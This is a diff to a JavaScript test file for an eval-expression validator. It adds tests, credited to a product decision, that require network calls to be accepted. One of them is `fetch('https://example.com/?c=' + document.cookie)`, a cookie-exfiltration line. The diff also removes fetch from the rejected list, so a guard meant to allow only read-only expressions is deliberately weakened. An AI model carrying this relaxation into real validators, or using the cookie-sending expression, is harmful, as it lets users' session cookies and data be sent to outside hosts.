@@ -37,6 +37,33 @@ describe('validateEvalExpression: accepted read-only expressions', () => {
   })
 })
 
+describe('validateEvalExpression: network-outbound APIs are allowed (product decision 2026-09-08)', () => {
+  it.each([
+    `fetch('https://example.com')`,
+    `fetch('https://example.com', { method: 'POST', body: 'x' })`,
+    `navigator.sendBeacon('https://example.com', 'x')`,
+    `fetch('https://example.com').then(r => r.text())`,
+    `window.postMessage('x', '*')`,
+    `fetch('https://example.com/?c=' + document.cookie)`,
+  ])('accepts %s (network call, no code execution)', (expression) => {
+    expect(() => validateEvalExpression(expression)).not.toThrow()
+  })
+
+  it('still rejects constructor-style network APIs (new is code execution)', () => {
+    // `new XMLHttpRequest()` / `new WebSocket()` / `new EventSource()` are
+    // rejected because `new` (arbitrary construction) is a code-execution
+    // node kind — the network-outbound relaxation does not lift `new`.
+    // Function-call forms (fetch/sendBeacon) are allowed above.
+    for (const expression of [
+      `new XMLHttpRequest()`,
+      `new WebSocket('wss://example.com')`,
+      `new EventSource('https://example.com')`,
+    ]) {
+      expect(() => validateEvalExpression(expression), expression).toThrow()
+    }
+  })
+})
+
 describe('validateEvalExpression: rejected writes and declarations', () => {
   it.each([
     // assignments / updates
@@ -54,7 +81,6 @@ describe('validateEvalExpression: rejected writes and declarations', () => {
     'new Date()',
     'new Map()',
     // side-effect / write APIs (called or member-accessed)
-    `fetch('https://x')`,
     `localStorage.setItem('a', 'b')`,
     `document.write('x')`,
     'form.submit()',
